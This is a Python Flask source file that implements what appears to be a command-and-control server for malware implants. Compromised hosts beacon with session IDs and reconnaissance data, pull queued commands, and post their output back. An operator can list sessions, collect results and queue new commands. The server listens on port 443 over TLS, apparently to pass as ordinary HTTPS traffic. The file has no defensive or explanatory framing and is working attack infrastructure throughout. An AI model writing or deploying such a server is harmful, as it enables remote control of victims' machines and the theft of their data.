import json
import ssl
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time
from collections import defaultdict

app = Flask(__name__)
CORS(app)

sessions = {}          # session_id -> { 'last_beacon': time, 'recon': {}, 'results': [] }
tasks = defaultdict(list)   # session_id -> list of pending commands

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    if not data or 'session' not in data:
        return jsonify({"error": "Invalid"}), 400
    sid = data['session']
    # update recon
    sessions[sid] = {
        'last_beacon': time.time(),
        'recon': data.get('recon', {}),
        'results': sessions.get(sid, {}).get('results', [])
    }
    # pop next task
    if sid in tasks and tasks[sid]:
        cmd = tasks[sid].pop(0)
        return jsonify({"cmd": cmd})
    return jsonify({"cmd": "sleep"})

@app.route('/result', methods=['POST'])
def result():
    data = request.get_json()
    if not data or 'session' not in data or 'output' not in data:
        return jsonify({"error": "Invalid"}), 400
    sid = data['session']
    if sid in sessions:
        sessions[sid]['results'].append(data['output'])
    return jsonify({"status": "ok"})

@app.route('/sessions', methods=['GET'])
def list_sessions():
    out = []
    for sid, info in sessions.items():
        out.append({
            'session': sid,
            'last_beacon': info['last_beacon'],
            'recon': info['recon'],
            'result_count': len(info['results'])
        })
    return jsonify(out)

@app.route('/results/<sid>', methods=['GET'])
def get_results(sid):
    if sid in sessions:
        res = sessions[sid]['results']
        sessions[sid]['results'] = []  # clear after retrieval
        return jsonify({"session": sid, "results": res})
    return jsonify({"error": "session not found"}), 404

# Operator CLI will use these endpoints to queue tasks
@app.route('/task', methods=['POST'])
def add_task():
    data = request.get_json()
    if not data or 'session' not in data or 'cmd' not in data:
        return jsonify({"error": "missing fields"}), 400
    sid = data['session']
    cmd = data['cmd']
    tasks[sid].append(cmd)
    return jsonify({"status": "queued"})

if __name__ == '__main__':
    # Generate self-signed cert for testing
    # Run: python -m pip install pyopenssl
    # For production, use real cert.
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('server.crt', 'server.key')  # generate with openssl
    app.run(host='0.0.0.0', port=443, ssl_context=context, threaded=True)